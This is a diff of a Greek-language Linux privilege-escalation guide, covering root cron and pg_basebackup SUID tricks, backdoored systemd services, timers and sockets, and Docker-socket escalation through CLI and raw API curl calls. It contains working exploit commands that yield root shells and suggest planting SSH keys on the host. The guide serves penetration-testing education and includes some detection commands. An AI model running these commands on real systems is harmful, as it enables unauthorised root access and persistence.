+Για παράδειγμα, για **παρακολούθηση κάθε 0.1s επί 1 λεπτό**, **ταξινόμηση με βάση τις εντολές που εκτελέστηκαν λιγότερες φορές** και διαγραφή των εντολών που εκτελέστηκαν τις περισσότερες φορές, μπορείτε να κάνετε:
+
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
-**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα εμφανίζει κάθε process που ξεκινά).
 
-### Root backups που διατηρούν τα mode bits που έχουν οριστεί από τον attacker (pg_basebackup)
+**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (θα παρακολουθεί και θα καταγράφει κάθε διεργασία που ξεκινά).
 
-Αν ένα cron που εκτελείται ως root χρησιμοποιεί το `pg_basebackup` (ή οποιοδήποτε recursive copy) σε έναν database directory στον οποίο έχετε δικαίωμα εγγραφής, μπορείτε να τοποθετήσετε ένα **SUID/SGID binary** το οποίο θα αντιγραφεί ξανά ως **root:root**, με τα ίδια mode bits, στο backup output.<sup>[[26]](#references)</sup>
+### Αντίγραφα ασφαλείας root που διατηρούν τα mode bits που όρισε ο επιτιθέμενος (pg_basebackup)
 
-Τυπική διαδικασία ανακάλυψης (ως low-priv DB user):
-- Χρησιμοποιήστε το `pspy` για να εντοπίσετε ένα root cron που καλεί κάτι όπως `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` κάθε λεπτό.
-- Επιβεβαιώστε ότι το source cluster (π.χ. `/var/lib/postgresql/14/main`) είναι writable από εσάς και ότι το destination (`/opt/backups/current`) αποκτά ιδιοκτήτη root μετά την εκτέλεση του job.
+Αν ένα cron που εκτελείται ως root χρησιμοποιεί το `pg_basebackup` (ή οποιαδήποτε αναδρομική αντιγραφή) σε έναν κατάλογο βάσης δεδομένων στον οποίο έχετε δικαίωμα εγγραφής, μπορείτε να τοποθετήσετε ένα **δυαδικό αρχείο SUID/SGID** που θα αντιγραφεί ξανά ως **root:root**, με τα ίδια mode bits, στον προορισμό του αντιγράφου ασφαλείας.<sup>[[26]](#references)</sup>
+
+Τυπική διαδικασία εντοπισμού (ως χρήστης DB με χαμηλά δικαιώματα):
+- Χρησιμοποιήστε το `pspy` για να εντοπίσετε ένα cron του root που εκτελεί κάθε λεπτό κάτι όπως `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
+- Επιβεβαιώστε ότι ο πηγαίος cluster (π.χ., `/var/lib/postgresql/14/main`) είναι εγγράψιμος από εσάς και ότι ο προορισμός (`/opt/backups/current`) αποκτά ιδιοκτήτη root μετά την εκτέλεση της εργασίας.
 
 Exploit:
+
 ```bash
 # As the DB service user owning the cluster directory
 cd /var/lib/postgresql/14/main
@@ -570,112 +653,128 @@ chmod 6777 bash
 ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
 /opt/backups/current/bash -p    # root shell without dropping privileges
 ```
-Αυτό λειτουργεί επειδή το `pg_basebackup` διατηρεί τα bits δικαιωμάτων αρχείου κατά την αντιγραφή του cluster· όταν εκτελείται από τον root, τα αρχεία προορισμού κληρονομούν **ιδιοκτησία root + SUID/SGID που έχει επιλέξει ο attacker**. Οποιαδήποτε παρόμοια προνομιακή ρουτίνα backup/αντιγραφής που διατηρεί τα δικαιώματα και γράφει σε μια εκτελέσιμη τοποθεσία είναι ευάλωτη.
+
+Αυτό λειτουργεί επειδή το `pg_basebackup` διατηρεί τα bits δικαιωμάτων αρχείων κατά την αντιγραφή του cluster· όταν εκτελείται από τον root, τα αρχεία προορισμού αποκτούν **ιδιοκτησία root + SUID/SGID που έχει επιλέξει ο attacker**. Κάθε παρόμοια προνομιούχα ρουτίνα backup/αντιγραφής που διατηρεί τα δικαιώματα και γράφει σε μια τοποθεσία όπου μπορούν να εκτελεστούν αρχεία είναι ευάλωτη.
 
 ### Αόρατα cron jobs
 
-Είναι δυνατή η δημιουργία ενός cronjob **τοποθετώντας έναν χαρακτήρα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε τον χαρακτήρα carriage return):
+Είναι δυνατό να δημιουργηθεί ένα cronjob **τοποθετώντας έναν χαρακτήρα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα αλλαγής γραμμής), και το cron job θα λειτουργήσει. Παράδειγμα (προσέξτε τον χαρακτήρα carriage return):
+
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
+
 Για να εντοπίσετε αυτού του είδους την κρυφή καταχώριση, εξετάστε τα αρχεία cron με εργαλεία που εμφανίζουν τους χαρακτήρες ελέγχου:
+
 ```bash
 cat -A /etc/crontab
 cat -A /etc/cron.d/*
 sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
 xxd /etc/crontab | head
 ```
+
 ## Υπηρεσίες
 
-### Writable _.service_ files
+### Εγγράψιμα αρχεία _.service_
 
-Ελέγξτε αν μπορείτε να γράψετε σε οποιοδήποτε αρχείο `.service`. Αν μπορείτε, **θα μπορούσατε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **τερματίζεται** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει reboot το machine).\
+Ελέγξτε αν μπορείτε να γράψετε σε κάποιο αρχείο `.service`. Αν μπορείτε, **θα μπορούσατε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **εκκινηθεί**, **επανεκκινηθεί** ή **σταματήσει** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος).\
 Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο αρχείο .service με **`ExecStart=/tmp/script.sh`**
 
-### Writable service binaries
+### Εγγράψιμα εκτελέσιμα αρχεία υπηρεσιών
 
-Έχετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για backdoors, ώστε όταν οι υπηρεσίες εκτελούνται ξανά να εκτελούνται τα backdoors.
+Έχετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε εκτελέσιμα αρχεία που εκτελούνται από υπηρεσίες**, μπορείτε να τα αντικαταστήσετε με backdoor, ώστε να εκτελούνται όταν εκτελεστούν ξανά οι υπηρεσίες.
 
-### systemd PATH - Relative Paths
+### systemd PATH - Σχετικές διαδρομές
 
-Μπορείτε να δείτε το PATH που χρησιμοποιείται από το **systemd** με:
+Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
+
 ```bash
 systemctl show-environment
 ```
-Αν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε φάκελο της διαδρομής, ίσως μπορέσετε να κάνετε **κλιμάκωση προνομίων**. Πρέπει να αναζητήσετε **σχετικές διαδρομές** που χρησιμοποιούνται σε αρχεία **διαμόρφωσης υπηρεσιών**, όπως:
+
+Αν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε φάκελο της διαδρομής, ίσως μπορέσετε να **escalate privileges**. Πρέπει να αναζητήσετε **relative paths** που χρησιμοποιούνται σε αρχεία διαμόρφωσης υπηρεσιών, όπως:
+
 ```bash
 ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Στη συνέχεια, δημιούργησε ένα **executable** με το **ίδιο όνομα με το binary του relative path** μέσα στον φάκελο του systemd PATH στον οποίο μπορείς να γράψεις και, όταν ζητηθεί από το service να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), θα εκτελεστεί το **backdoor** σου (οι unprivileged χρήστες συνήθως δεν μπορούν να κάνουν start/stop services, αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις το `sudo -l`).
 
-**Μάθε περισσότερα για τα services με το `man systemd.service`.**
+Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο** με **το ίδιο όνομα με το binary της σχετικής διαδρομής** μέσα στον φάκελο PATH του systemd στον οποίο έχετε δικαίωμα εγγραφής. Όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), θα εκτελεστεί το **backdoor** σας (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να ξεκινήσουν ή να σταματήσουν υπηρεσίες, αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε το `sudo -l`).
+
+**Μάθετε περισσότερα για τις υπηρεσίες με το `man systemd.service`.**
 
 ## **Timers**
 
-Τα **Timers** είναι αρχεία μονάδων του systemd των οποίων το όνομα τελειώνει σε **.timer** και τα οποία ελέγχουν αρχεία **.service** ή events. Τα **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς διαθέτουν ενσωματωμένη υποστήριξη για calendar time events και monotonic time events και μπορούν να εκτελούνται ασύγχρονα.
+Τα **Timers** είναι αρχεία μονάδων systemd με όνομα που τελειώνει σε `**.timer**` και ελέγχουν αρχεία `**.service**` ή συμβάντα. Τα **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική λύση στο cron, καθώς διαθέτουν ενσωματωμένη υποστήριξη για συμβάντα ημερολογιακής και μονότονης χρονικής στιγμής και μπορούν να εκτελούνται ασύγχρονα.
 
-Μπορείς να απαριθμήσεις όλα τα timers με:
+Μπορείτε να απαριθμήσετε όλα τα timers με:
+
 ```bash
 systemctl list-timers --all
 ```
-### Εγγράψιμα timers
 
-Αν μπορείτε να τροποποιήσετε ένα timer, μπορείτε να το κάνετε να εκτελεί κάποια systemd.unit (όπως ένα `.service` ή ένα `.target`)
+### Εγγράψιμοι χρονοδιακόπτες
+
+Αν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει κάποια υπάρχουσα μονάδα του systemd.unit (όπως ένα `.service` ή ένα `.target`).
+
 ```bash
 Unit=backdoor.service
 ```
-Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:
 
-> Το Unit που θα ενεργοποιηθεί όταν λήξει αυτό το timer. Το όρισμα είναι ένα όνομα Unit, του οποίου το επίθημα δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή από προεπιλογή είναι ένα service που έχει το ίδιο όνομα με το timer Unit, εκτός από το επίθημα. (Δείτε παραπάνω.) Συνιστάται το όνομα του Unit που ενεργοποιείται και το όνομα του timer Unit να είναι πανομοιότυπα, εκτός από το επίθημα.
+Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η μονάδα:
 
-Επομένως, για να καταχραστείτε αυτή την άδεια, θα πρέπει να:
+> Η μονάδα που θα ενεργοποιηθεί όταν παρέλθει αυτός ο χρονοδιακόπτης. Το όρισμα είναι ένα όνομα μονάδας, του οποίου η κατάληξη δεν είναι ".timer". Αν δεν καθοριστεί, η προεπιλεγμένη τιμή είναι μια υπηρεσία με το ίδιο όνομα με τη μονάδα χρονοδιακόπτη, χωρίς την κατάληξη. (Βλ. παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας χρονοδιακόπτη να είναι ίδια, εκτός από την κατάληξη.
 
-- Εντοπίσετε κάποιο systemd Unit (όπως ένα `.service`) που **εκτελεί ένα writable binary**
-- Εντοπίσετε κάποιο systemd Unit που **εκτελεί ένα relative path** και έχετε **writable privileges** πάνω στο **systemd PATH** (για να impersonate αυτό το executable)
+Επομένως, για να καταχραστείτε αυτό το δικαίωμα θα πρέπει να:
 
-**Μάθετε περισσότερα για τα timers με `man systemd.timer`.**
+- Βρείτε κάποια μονάδα systemd (όπως ένα `.service`) που **εκτελεί ένα δυαδικό αρχείο στο οποίο έχετε δικαίωμα εγγραφής**
+- Βρείτε κάποια μονάδα systemd που **εκτελεί μια σχετική διαδρομή** και να έχετε **δικαιώματα εγγραφής στο systemd PATH** (ώστε να υποδυθείτε αυτό το εκτελέσιμο αρχείο)
 
-### **Ενεργοποίηση Timer**
+**Μάθετε περισσότερα για τους χρονοδιακόπτες με `man systemd.timer`.**
 
-Για να ενεργοποιήσετε ένα timer χρειάζεστε root privileges και να εκτελέσετε:
+### **Ενεργοποίηση χρονοδιακόπτη**
+
+Για να ενεργοποιήσετε έναν χρονοδιακόπτη χρειάζεστε δικαιώματα root και πρέπει να εκτελέσετε:
+
 ```bash
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Σημειώστε ότι το **timer** **ενεργοποιείται** δημιουργώντας ένα symlink προς αυτό στη διαδρομή `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+
+Σημειώστε ότι το **timer** **ενεργοποιείται** δημιουργώντας έναν συμβολικό σύνδεσμο προς αυτό στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
 
 ## Sockets
 
-Τα Unix Domain Sockets (UDS) επιτρέπουν **επικοινωνία μεταξύ διεργασιών** στο ίδιο ή σε διαφορετικά μηχανήματα, μέσα σε client-server models. Χρησιμοποιούν τυπικά Unix descriptor files για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω αρχείων `.socket`.<sup>[[14]](#references)</sup>
+Τα Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία μεταξύ διεργασιών** στο ίδιο ή σε διαφορετικά μηχανήματα, στο πλαίσιο μοντέλων client-server. Χρησιμοποιούν τυπικά αρχεία περιγραφέων Unix για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω αρχείων `.socket`.<sup>[[14]](#references)</sup>
 
-Τα Sockets μπορούν να ρυθμιστούν μέσω αρχείων `.socket`.
+Τα sockets μπορούν να ρυθμιστούν μέσω αρχείων `.socket`.
 
-**Μάθετε περισσότερα για τα sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:
+**Μάθετε περισσότερα για τα sockets με την εντολή `man systemd.socket`.** Μέσα σε αυτό το αρχείο μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:
 
-- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν, αλλά συνοπτικά χρησιμοποιούνται για να **υποδείξουν πού θα κάνει listen** το socket (τη διαδρομή του αρχείου AF_UNIX socket, τη διεύθυνση IPv4/6 ή/και τον αριθμό port όπου θα κάνει listen κ.λπ.)
-- `Accept`: Δέχεται ένα boolean όρισμα. Αν είναι **true**, γίνεται **spawn ενός service instance για κάθε εισερχόμενη σύνδεση** και σε αυτό μεταβιβάζεται μόνο το connection socket. Αν είναι **false**, όλα τα listening sockets τα ίδια **μεταβιβάζονται στο service unit που ξεκινά**, και γίνεται spawn μόνο ενός service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs, όπου ένα service unit διαχειρίζεται άνευ όρων όλη την εισερχόμενη κίνηση. **Η προεπιλογή είναι false**. Για λόγους απόδοσης, συνιστάται τα νέα daemons να γράφονται μόνο με τρόπο κατάλληλο για `Accept=no`.
-- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τη **δημιουργία** και το bind των listening **sockets**/FIFOs, αντίστοιχα. Το πρώτο token της γραμμής εντολών πρέπει να είναι ένα απόλυτο filename και στη συνέχεια να ακολουθούν τα arguments της διεργασίας.
-- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** το **κλείσιμο** και την αφαίρεση των listening **sockets**/FIFOs, αντίστοιχα.
-- `Service`: Καθορίζει το όνομα του **service** unit που θα **ενεργοποιηθεί** με **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Ως προεπιλογή χρησιμοποιείται το service με το ίδιο όνομα με το socket (με αντικατάσταση του suffix). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να είναι απαραίτητη η χρήση αυτής της επιλογής.
+- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν μεταξύ τους, αλλά συνοπτικά **υποδεικνύουν πού θα ακούει** το socket (τη διαδρομή του αρχείου socket AF_UNIX, τη διεύθυνση IPv4/6 ή/και τον αριθμό θύρας όπου θα ακούει κ.λπ.)
+- `Accept`: Δέχεται όρισμα boolean. Αν είναι **true**, **δημιουργείται ένα instance της υπηρεσίας για κάθε εισερχόμενη σύνδεση** και σε αυτό περνά μόνο το socket της σύνδεσης. Αν είναι **false**, όλα τα ίδια τα sockets που ακούν **περνούν στη μονάδα υπηρεσίας που εκκινείται** και δημιουργείται μόνο μία μονάδα υπηρεσίας για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για sockets datagram και FIFOs, όπου μία μονάδα υπηρεσίας χειρίζεται υποχρεωτικά όλη την εισερχόμενη κίνηση. **Η προεπιλεγμένη τιμή είναι false**. Για λόγους απόδοσης, συνιστάται η δημιουργία νέων daemons μόνο με τρόπο συμβατό με `Accept=no`.
+- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τη δημιουργία και τη σύνδεση των **sockets**/FIFOs που ακούν, αντίστοιχα. Το πρώτο token της γραμμής εντολών πρέπει να είναι απόλυτο όνομα αρχείου και να ακολουθούν τα ορίσματα της διεργασίας.
+- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** το κλείσιμο και την αφαίρεση των **sockets**/FIFOs που ακούν, αντίστοιχα.
+- `Service`: Καθορίζει το όνομα της μονάδας **υπηρεσίας που θα ενεργοποιηθεί** κατά την **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Ως προεπιλογή, χρησιμοποιείται η υπηρεσία που έχει το ίδιο όνομα με το socket (με αντικατάσταση της κατάληξης). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να χρειάζεται να χρησιμοποιήσετε αυτήν την επιλογή.
 
-### Writable .socket files
+### Εγγράψιμα αρχεία .socket
 
-Αν βρείτε ένα **writable** αρχείο `.socket`, μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι όπως: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot του μηχανήματος.**\
-_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί τη configuration αυτού του socket file, διαφορετικά το backdoor δεν θα εκτελεστεί_
+Αν βρείτε ένα **εγγράψιμο** αρχείο `.socket`, μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι όπως: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος.**\
+_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί τη διαμόρφωση αυτού του αρχείου socket, αλλιώς το backdoor δεν θα εκτελεστεί_
 
-### Socket activation + writable unit path (create missing service)
+### Ενεργοποίηση socket + εγγράψιμη διαδρομή μονάδας (δημιουργία υπηρεσίας που λείπει)
 
-Μια ακόμη misconfiguration υψηλού αντίκτυπου είναι:
+Μια άλλη σοβαρή λανθασμένη διαμόρφωση είναι η εξής:
 
-- ένα socket unit με `Accept=no` και `Service=<name>.service`
-- το referenced service unit λείπει
-- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλο unit search path)
+- μια μονάδα socket με `Accept=no` και `Service=<name>.service`
+- η μονάδα υπηρεσίας που αναφέρεται δεν υπάρχει
+- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλη διαδρομή αναζήτησης μονάδων)
 
-Σε αυτή την περίπτωση, ο attacker μπορεί να δημιουργήσει το `<name>.service` και στη συνέχεια να προκαλέσει κίνηση προς το socket, ώστε το systemd να φορτώσει και να εκτελέσει το νέο service ως root.
+Σε αυτήν την περίπτωση, ο attacker μπορεί να δημιουργήσει το `<name>.service` και έπειτα να προκαλέσει κίνηση προς το socket, ώστε το systemd να φορτώσει και να εκτελέσει τη νέα υπηρεσία ως root.
 
 Γρήγορη ροή:
+
 ```bash
 systemctl cat vuln.socket
 # [Socket]
@@ -692,15 +791,19 @@ EOF
 nc -q0 127.0.0.1 9999
 /var/tmp/rootbash -p
 ```
+
 ### Εγγράψιμα sockets
 
-Αν **εντοπίσετε οποιοδήποτε εγγράψιμο socket** (_εδώ μιλάμε για Unix Sockets και όχι για τα αρχεία ρυθμίσεων `.socket`_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε μια ευπάθεια.
+Αν **εντοπίσετε οποιοδήποτε εγγράψιμο socket** (_εδώ μιλάμε για Unix Sockets και όχι για τα αρχεία ρυθμίσεων `.socket`_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.
 
 ### Απαρίθμηση Unix Sockets
+
 ```bash
 netstat -a -p --unix
 ```
+
 ### Ακατέργαστη σύνδεση
+
 ```bash
 #apt-get install netcat-openbsd
 nc -U /tmp/socket  #Connect to UNIX-domain stream socket
@@ -709,7 +812,8 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 #apt-get install socat
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
-**Παράδειγμα exploitation:**
+
+**Παράδειγμα εκμετάλλευσης:**
 
 
 {{#ref}}
@@ -718,93 +822,105 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 ### HTTP sockets
 
-Σημειώστε ότι μπορεί να υπάρχουν ορισμένα **sockets που ακούν αιτήματα HTTP** (_δεν αναφέρομαι σε αρχεία .socket, αλλά σε αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
+Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets που ακούν αιτήματα HTTP** (_δεν μιλάω για αρχεία .socket, αλλά για αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
+
 ```bash
 curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
 ```
-Αν το socket **αποκρίνεται με ένα αίτημα HTTP**, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.
 
-### Writable Docker Socket
+Αν το socket **απαντά με ένα HTTP** request, τότε μπορείς να **επικοινωνήσεις** μαζί του και ίσως να **εκμεταλλευτείς κάποια ευπάθεια**.
 
-Το Docker socket, το οποίο βρίσκεται συχνά στη διαδρομή `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που θα πρέπει να είναι ασφαλές. Από προεπιλογή, είναι writable από τον χρήστη `root` και τα μέλη του group `docker`. Η κατοχή write access σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση του τρόπου με τον οποίο μπορεί να γίνει αυτό, καθώς και εναλλακτικές μέθοδοι σε περίπτωση που το Docker CLI δεν είναι διαθέσιμο.
+### Εγγράψιμο Docker Socket
 
-#### **Privilege Escalation with Docker CLI**
+Το Docker socket, που συνήθως βρίσκεται στη διαδρομή `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατεύεται. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η δυνατότητα εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε κλιμάκωση προνομίων. Ακολουθεί μια ανάλυση του τρόπου με τον οποίο μπορεί να γίνει αυτό, καθώς και εναλλακτικών μεθόδων αν δεν είναι διαθέσιμο το Docker CLI.
 
-Αν έχετε write access στο Docker socket, μπορείτε να κάνετε privilege escalation χρησιμοποιώντας τις ακόλουθες εντολές:<sup>[[15]](#references)</sup>
+#### **Κλιμάκωση προνομίων με Docker CLI**
+
+Αν έχεις δυνατότητα εγγραφής στο Docker socket, μπορείς να κλιμακώσεις τα προνόμιά σου με τις ακόλουθες εντολές:<sup>[[15]](#references)</sup>
+
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-Αυτές οι εντολές σάς επιτρέπουν να εκτελέσετε ένα container με πρόσβαση επιπέδου root στο file system του host.
+
+Αυτές οι εντολές σάς επιτρέπουν να εκτελέσετε ένα container με πρόσβαση root στο σύστημα αρχείων του host.
 
 #### **Χρήση του Docker API απευθείας**
 
-Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί και πάλι να γίνει αντικείμενο κατάχρησης μέσω raw HTTP πάνω από το Unix socket. Η πιο αξιόπιστη ροή είναι:
+Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, μπορείτε και πάλι να κάνετε κατάχρηση του Docker socket χρησιμοποιώντας ακατέργαστο HTTP μέσω του Unix socket. Η πιο αξιόπιστη διαδικασία είναι:
 
-- δημιουργήστε ένα helper container μεγάλης διάρκειας ζωής με το host root να έχει γίνει bind-mounted
+- δημιουργήστε ένα βοηθητικό container μεγάλης διάρκειας ζωής, με το root του host προσαρτημένο μέσω bind mount
 - εκκινήστε το
-- δημιουργήστε ένα `exec` instance μέσα σε αυτό το helper
-- εκκινήστε το `exec` instance και διαβάστε την έξοδο πίσω μέσω του API
+- δημιουργήστε ένα `exec` instance μέσα σε αυτό το βοηθητικό container
+- εκκινήστε το `exec` instance και διαβάστε την έξοδο μέσω του API
 
-**Λίστα Docker images**
+**Λίστα εικόνων Docker**
+
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
-**Δημιουργία και εκκίνηση ενός helper container**
+
+**Δημιουργήστε και εκκινήστε ένα βοηθητικό container**
+
 ```bash
 HELPER=helper
 
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
-"http://localhost/v1.47/containers/create?name=${HELPER}"
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
+  "http://localhost/v1.47/containers/create?name=${HELPER}"
 
 curl --unix-socket /var/run/docker.sock \
--X POST "http://localhost/v1.47/containers/${HELPER}/start"
+  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
 ```
-**Δημιουργία ενός exec instance**
+
+**Δημιουργήστε ένα exec instance**
+
 ```bash
 EXEC_ID=$(
-curl -s --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
-"http://localhost/v1.47/containers/${HELPER}/exec" \
-| tr -d '\n' \
-| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
+  curl -s --unix-socket /var/run/docker.sock \
+    -H "Content-Type: application/json" \
+    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
+    "http://localhost/v1.47/containers/${HELPER}/exec" \
+  | tr -d '\n' \
+  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
 )
 ```
+
 **Εκκινήστε το exec instance και διαβάστε την έξοδο**
+
 ```bash
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Detach":false,"Tty":true}' \
-"http://localhost/v1.47/exec/${EXEC_ID}/start"
+  -H "Content-Type: application/json" \
+  -d '{"Detach":false,"Tty":true}' \
+  "http://localhost/v1.47/exec/${EXEC_ID}/start"
 ```
-Αυτό το μοτίβο είναι συνήθως πιο αξιόπιστο από την προσπάθεια χειροκίνητου χειρισμού του `attach` με `socat` ή `nc -U`. Μόλις μπορέσετε να δημιουργήσετε ένα helper με `/:/host`, μπορείτε να χρησιμοποιήσετε πρόσθετα instances του `exec` για να διαβάσετε αρχεία όπως `/host/root/...`, να προσθέσετε SSH keys στο `/host/root/.ssh` ή να τροποποιήσετε αρχεία εκκίνησης του host.
+
+Αυτό το μοτίβο είναι συνήθως πιο αξιόπιστο από το να προσπαθείτε να χειριστείτε χειροκίνητα το `attach` με `socat` ή `nc -U`. Μόλις μπορέσετε να δημιουργήσετε ένα helper με `/:/host`, μπορείτε να χρησιμοποιήσετε επιπλέον instances του `exec` για να διαβάσετε αρχεία όπως το `/host/root/...`, να προσθέσετε SSH keys στο `/host/root/.ssh` ή να τροποποιήσετε αρχεία εκκίνησης του host.
 
 ### Άλλα
 
